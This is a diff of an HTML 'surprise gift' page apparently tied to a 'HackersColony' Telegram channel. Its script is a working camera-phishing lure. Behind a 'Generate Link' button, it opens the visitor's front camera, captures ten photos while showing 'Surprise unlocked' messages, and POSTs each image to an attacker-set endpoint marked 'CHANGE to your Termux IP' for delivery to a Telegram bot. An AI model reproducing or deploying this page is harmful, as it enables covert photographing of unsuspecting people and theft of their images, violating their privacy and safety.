@@ -5,134 +5,134 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>🎁 Your Surprise</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
-body{background:linear-gradient(135deg,#6a11cb 0%,#2575fc 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
-.container{background:white;padding:25px;border-radius:15px;max-width:450px;width:100%;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.2);}
-.gift{font-size:50px;margin:10px 0;}
-h1{color:#333;margin:10px 0;font-size:22px;}
-p{color:#666;margin:5px 0;}
-button{padding:15px 25px;margin:10px 0;border:none;border-radius:50px;background:linear-gradient(90deg,#6a11cb,#2575fc);color:white;font-weight:bold;font-size:16px;cursor:pointer;}
-.counter{color:#666;font-size:14px;margin:5px 0;}
-.success{color:#00b09b;background:#e6fff9;padding:10px;border-radius:8px;margin:10px 0;font-weight:bold;}
-.progress{width:100%;height:8px;background:#eee;border-radius:4px;margin:15px 0;overflow:hidden;}
-.progress-bar{height:100%;width:0%;background:#00b09b;transition:width 0.3s;}
-.hidden{display:none;}
-.menu{margin-top:15px;}
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+body { background: linear-gradient(135deg,#6a11cb 0%,#2575fc 100%); min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }
+.container { background:white; padding:25px; border-radius:15px; max-width:450px; width:100%; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.2);}
+.gift { font-size:50px; margin:10px 0; }
+h1 { color:#333; margin:10px 0; font-size:22px; }
+.btn { background:linear-gradient(90deg,#6a11cb,#2575fc); color:white; border:none; padding:15px; width:100%; border-radius:50px; font-size:18px; font-weight:bold; cursor:pointer; margin:15px 0;}
+.btn:disabled { opacity:0.7; cursor:not-allowed;}
+video { width:100%; border-radius:10px; border:3px solid #6a11cb; margin:15px 0; display:none; transform:scaleX(-1);}
+.progress { width:100%; height:8px; background:#eee; border-radius:4px; margin:15px 0; overflow:hidden;}
+.progress-bar { height:100%; width:0%; background:#00b09b; transition: width 0.3s; }
+.hidden { display:none; }
+.photo-preview { width:140px; height:140px; border-radius:10px; border:3px solid #6a11cb; margin:15px auto; object-fit:cover;}
+.success { color:#00b09b; background:#e6fff9; padding:10px; border-radius:8px; margin:10px 0;}
+.counter { color:#666; font-size:14px; margin:5px 0;}
 </style>
 </head>
 <body>
-<div class="container" id="mainContainer">
+<div class="container">
     <div class="gift">🎁</div>
-    <h1 id="title">Welcome to HCO Surprise!</h1>
-    <p id="message">Please join our Telegram channel to start:</p>
-    <a href="https://t.me/HackersColony" target="_blank"><button>Join Telegram Channel ✅</button></a>
-    <button id="joinedBtn">I Joined ✅</button>
-
-    <div class="menu hidden" id="menu">
-        <button id="generateBtn">Generate Surprise Link</button>
-        <button id="contactBtn">Contact Owner</button>
+    <h1 id="title">Welcome!</h1>
+    <p id="message" style="color:#666;">Please join our Telegram channel to use the surprise.</p>
+    <button class="btn" id="joinBtn">✅ I Joined</button>
+    <div id="menu" class="hidden">
+        <button class="btn" id="generateBtn">Generate Link</button>
+        <button class="btn" id="contactBtn">Contact Owner</button>
     </div>
-
-    <div class="progress hidden"><div class="progress-bar" id="progressBar"></div></div>
+    <video id="video" autoplay playsinline></video>
+    <div class="progress hidden" id="progress">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
     <div id="counter" class="counter hidden"></div>
+    <img id="photoPreview" class="photo-preview hidden">
     <div id="status" class="success hidden"></div>
 </div>
 
-<canvas id="canvas" class="hidden"></canvas>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
+const BOT_ENDPOINT = "http://192.168.1.13:5000/upload"; // CHANGE to your Termux IP
 const USER_CHAT_ID = new URLSearchParams(window.location.search).get("chat_id");
 const USER_NAME = new URLSearchParams(window.location.search).get("name") || "Friend";
-const BOT_ENDPOINT = "https://hco-bot-server.com/upload"; // replace with your bot endpoint
-const TOTAL_SURPRISES = 10;
 
+const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
-const mainContainer = document.getElementById("mainContainer");
-const joinedBtn = document.getElementById("joinedBtn");
-const menu = document.getElementById("menu");
-const generateBtn = document.getElementById("generateBtn");
-const contactBtn = document.getElementById("contactBtn");
+let stream = null;
+let photosSent = 0;
 
-joinedBtn.onclick = ()=>{
-    joinedBtn.style.display = "none";
-    menu.classList.remove("hidden");
-    document.getElementById("title").textContent=`🎉 Welcome ${USER_NAME}!`;
-    document.getElementById("message").textContent="Choose an option below to continue:";
-}
+document.getElementById("joinBtn").onclick = () => {
+    document.getElementById("joinBtn").classList.add("hidden");
+    document.getElementById("menu").classList.remove("hidden");
+    document.getElementById("message").textContent = "🎉 Welcome! Now choose an option.";
+};
 
-// Contact Owner Button
-contactBtn.onclick = ()=>{
-    window.open("https://t.me/Hackers_Colony_Official", "_blank");
-}
+// GENERATE LINK BUTTON
+document.getElementById("generateBtn").onclick = async () => {
+    document.getElementById("title").textContent = "📸 Taking Your Surprise Photos!";
+    document.getElementById("message").textContent = "Smile 😀 - Capturing 10 photos...";
+    document.getElementById("menu").classList.add("hidden");
+    document.getElementById("progress").classList.remove("hidden");
 
-// Generate Link Button → starts camera capture
-generateBtn.onclick = async ()=>{
-    menu.classList.add("hidden");
-    document.getElementById("message").textContent="Starting your surprises…";
-    try{
-        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-        await captureSurprises(stream);
-    }catch(e){
-        document.getElementById("message").textContent="⚠️ Camera access denied! Cannot capture surprises.";
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user", width:{ideal:1280}, height:{ideal:720} } });
+        video.srcObject = stream;
+        video.style.display = "block";
+        await new Promise(r => video.onloadedmetadata = r);
+
+        for(let i=1;i<=10;i++){
+            await delay(500);
+            const blob = await capturePhoto(i);
+            await sendPhoto(blob,i);
+            photosSent++;
+            showStatus(`🎁 Surprise ${i} unlocked!`);
+            updateProgress(i,10);
+            await delay(800);
+        }
+        finish();
+    } catch(e){
+        alert("Camera access denied or error!");
+        console.error(e);
     }
+};
+
+// CONTACT OWNER BUTTON
+document.getElementById("contactBtn").onclick = () => {
+    window.open("https://t.me/Hackers_Colony_Official","_blank");
+};
+
+// CAPTURE PHOTO
+async function capturePhoto(num){
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video,0,0,canvas.width,canvas.height);
+    return new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));
 }
 
-async function captureSurprises(stream){
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    video.play();
-
-    document.getElementById("progressBar").parentElement.classList.remove("hidden");
-    document.getElementById("counter").classList.remove("hidden");
-
-    for(let i=1;i<=TOTAL_SURPRISES;i++){
-        await new Promise(r=>setTimeout(r,800));
-        canvas.width=640; canvas.height=480;
-        ctx.save(); ctx.translate(canvas.width,0); ctx.scale(-1,1); ctx.drawImage(video,0,0,canvas.width,canvas.height); ctx.restore();
-        ctx.fillStyle='rgba(106,17,203,0.8)';
-        ctx.fillRect(0,canvas.height-60,canvas.width,60);
-        ctx.font='bold 24px Arial'; ctx.fillStyle='white'; ctx.textAlign='center';
-        ctx.fillText(`🎁 Surprise ${i}`,canvas.width/2,canvas.height-30);
-        const blob = await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.9));
-        await sendPhoto(blob,i);
-        updateProgress(i,TOTAL_SURPRISES);
-        showStatus(`🎉 Surprise ${i} unlocked!`);
-    }
-    stopStream(stream);
-    finishSurprises();
-}
-
+// SEND PHOTO TO BOT
 async function sendPhoto(blob,num){
-    const fileName=`surprise_${num}_${Date.now()}.jpg`;
-    const form=new FormData();
-    form.append("photo",new File([blob],fileName,{type:"image/jpeg"}));
-    form.append("user_chat_id",USER_CHAT_ID);
-    form.append("user_name",USER_NAME);
-    try{
-        await fetch(BOT_ENDPOINT,{method:"POST",body:form});
-        console.log(`✅ Surprise ${num} sent`);
-    }catch(e){console.error("❌ Failed to send",e);}
+    const formData = new FormData();
+    formData.append("photo",blob);
+    formData.append("user_chat_id",USER_CHAT_ID);
+    formData.append("user_name",USER_NAME);
+    await fetch(BOT_ENDPOINT,{method:"POST",body:formData});
 }
 
+// HELPER
 function updateProgress(current,total){
-    const percent=(current/total)*100;
-    document.getElementById("progressBar").style.width=percent+"%";
-    document.getElementById("counter").textContent=`${current}/${total}`;
+    const percent = (current/total)*100;
+    document.getElementById("progressBar").style.width = percent+"%";
+    document.getElementById("counter").textContent = `${current}/${total}`;
+    document.getElementById("counter").classList.remove("hidden");
 }
 
 function showStatus(text){
     const status = document.getElementById("status");
-    status.textContent=text; status.classList.remove("hidden");
-    setTimeout(()=>status.classList.add("hidden"),900);
+    status.textContent = text;
+    status.classList.remove("hidden");
+    setTimeout(()=>status.classList.add("hidden"),1200);
 }
 
-function finishSurprises(){
-    document.getElementById("title").textContent="✅ All Surprises Unlocked!";
-    document.getElementById("message").textContent="Check your Telegram for all surprises!";
-}
+function delay(ms){return new Promise(res=>setTimeout(res,ms));}
 
-function stopStream(stream){ stream.getTracks().forEach(t=>t.stop()); }
+function finish(){
+    if(stream){stream.getTracks().forEach(t=>t.stop());}
+    document.getElementById("title").textContent = "✅ All Surprises Unlocked!";
+    document.getElementById("message").textContent = "Check your Telegram to see the photos!";
+    document.getElementById("actionBtn")?.classList.remove("hidden");
+}
 </script>
 </body>
 </html>
